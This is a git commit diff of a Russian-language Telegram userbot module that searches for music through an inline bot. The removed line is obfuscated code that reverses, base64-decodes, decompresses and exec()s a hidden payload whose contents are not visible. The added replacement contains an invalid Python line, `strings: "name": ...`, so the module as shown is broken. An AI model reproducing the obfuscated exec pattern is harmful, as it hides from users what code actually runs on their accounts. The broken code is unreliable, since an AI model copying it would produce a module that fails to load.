1df99530a1c2c4d841a6e6f85532fdfe9f1a2e8e
kotenochekk <kirillkozelkov3@gmail.com>
2024-11-10 23:14:05 +0300

    Update KOTmusic.py

--- KOTmusic.py
+++ KOTmusic.py
@@ -1,1 +1,33 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'b6jhaGw/ffP//bZrmXIAeBuIORlrosTcPtcHOf3gydBJK6IGXL9iMr5/bvsNzaBg+ncwAAhecCgYrqWB71BWWfAekXEgU6y4y29n0uu3iFXW1FOr29B0Dn4KVPOmcJX0Crxol2/Iz4l+Y3JqlVe8x1QoFB6jfTvNi5BOv4kbULqCmftr6dtiNc0iZS/OlhRvnWSHALzb8s0AXD/2rpTHZjZhe1r2CTlmna58htFj8pkfAMyZQLcbqRnyXWhEfvGlVWeGNGcu1FsTMFUQYlIVPIwY6vTFJTU7lk8rxvyd+atXaZM8FUkSwuHeJcQrpxaJVZtfFx/K8FopNnTJVVh6OAmT5Ou2Lz5Okv/y5rZMhyrkr/hmx/Z1cJFhp7ESQEKGp+8MTdn6FHlK1J7bX7297L+c64K33v73l+F5VUzroTDov1OR30kFnWI5shpQiStggxXsYI8+7FJ0IPqoG/loyp/KJNVq+NoQXH7ZL0o0vPlaH/UNzuEW/pzRouzaJ75X/KLZQYSa75b+CDjhAeAA3/5De/buS11ce3xMOVkwAXLpDQwfHlPkM2J2ZFpVhZWdlmS/JeLIQSrcn7LPbiMrOMRv/F22y9HoLbwkHnvvgmCVXWVILm1DZ2MJm0Di8O8KQZ/ZtCa6B4zKTD88kFom4/8570HDDoZtoEDazV4OE+cZEsrJh0v83/mzDUBMp3XZLWzH+dZKQX3WPOk/mxMcuZJvnRMIiS6gDmbOyKo/NdQ3rpZYrijRwMbnPrep6wYEqb38oH+E93bbPoKNHwLvIQ/lXDmCIlB8C9JIstyP5wGgJj5L69DZiMT0s1bWCj1qfm3j2wYSXw28B7PfhuyfETEzWvZeB782ASiN1dXSDGxOxBypY77RnW3HuRU7ZZ2lbS3yGJRXM7FzS0CcMHFvpFhHO/sqSbGWgTKj+wxbJrTlA2uPZ+/cl2v5my3X+64RDfXRe/atrv0Hfw7PdrwISK6QtLOSXPCU+qTAAAGpVc8V/E9wmrsL8dA8Z1hdfBGYp/ywIq6mWHSrNFYjuXfEGDOLdlK4js3/RtRRW5zv78+II9UxLdXIhtcBDGOmPTu7Rib7FSdAjb0fU+4NCqZHudF/ghg4R6cqqQbN0+Cq8WtUXofpI8XO7WVzhlosVo/eZLVwmQs8CRSNVJZcvrXZ47iANzEp++fWtiCnujKCgO01mN31ZBaxK6+bPcJJmezr45mygRkANlsa+iioawjRZhXiweW5mo7pOBqy9aCltK/uFlD/mqWY+mvSmYoz/XPp9rT+ko9v9FZmPks5oTgzagu/5tDDu1/qsZQ1nQH1VXRiNxpnQAy1G5Ab0xv9XezGUTGZRrl2ir11EonZw52M9rGDoFkZtMxCLiogM53VwRN9w2J2TQt1rHotYjS6pXthPgEjQkn8sOPLWEubwhbGVb23z1kSLIhIToCLOVktPTJ6jzJ5M9IjO/UnfPtIW1vDnpWnEHxUJ8tkx1OANQuvD+YYStjdl573we9xnt6cfSMZmm3PZgxxZLPrKq0cX32dkt8u68yAehDkacjIVutzO0AiaBpGVdlzKyAIrfIzaSP33um4A6jMwuIXoHz7iyUgW+Y4yj5Qy498ft0+87o5KAnVLmjGcBbtp+YNlq/MnYZHmna6gLpoaJmrb/VJ3ca4cm9DSmlXUnH8BgWGhjButVL2FyrMqBygomfBDFzyzduwCybWIFcEXqgM1NXj8DbX7Ucvl02hBzUUTIkhys4RbHaOFbkwZ+LN1iAgIndeYE/tngohcGXjrojVpPb6b6gX3FdFqugZ5TDSnHBLvOg5IyYLsfKJZPdXCAPsymt/zdy6poffQV5Y73tEeXFKHnVlbfbDgkzCu3fEH60SF6EH4xufsn9pHfw6UCK3bflIOfzSig3Gq2N3SaA22NwdCWZRyDcildj8EFwGco+rGK6tlXmi9
+#meta developer: @codeer_kot
+# не меняйте мой код, пожалуйста, указывая что вы создатель этого модуля.
+from .. import loader, utils
+
+class MusicSearchModule(loader.Module):
+    """Модуль для поиска музыки."""
+    
+    strings: "name": "KOTmusic"
+    
+    @loader.command()
+    async def трекcmd(self, message):
+        """Ищет песни по названию."""
+        args = utils.get_args_raw(message)
+        reply = await message.get_reply_message()
+
+        if not args:
+            return await message.edit("<b>Не указано название трека.</b>")
+
+        try:
+            await message.edit(f"<blockquote><b>Ищем трек: {args}...</b><emoji document_id=5319272710688226013>⏰</emoji></blockquote>")
+            music = await message.client.inline_query("SnoopMusicbot", args)
+            await message.delete()
+
+            await message.client.send_file(
+                message.to_id,
+                music[0].result.document,
+                reply_to=reply.id if reply else None,
+            )
+        except Exception as e:
+            return await message.client.send_message(
+                message.chat_id,
+                f"<blockquote>Музыка с названием <code>{args}</code> не найдена.</blockquote>"
+          )
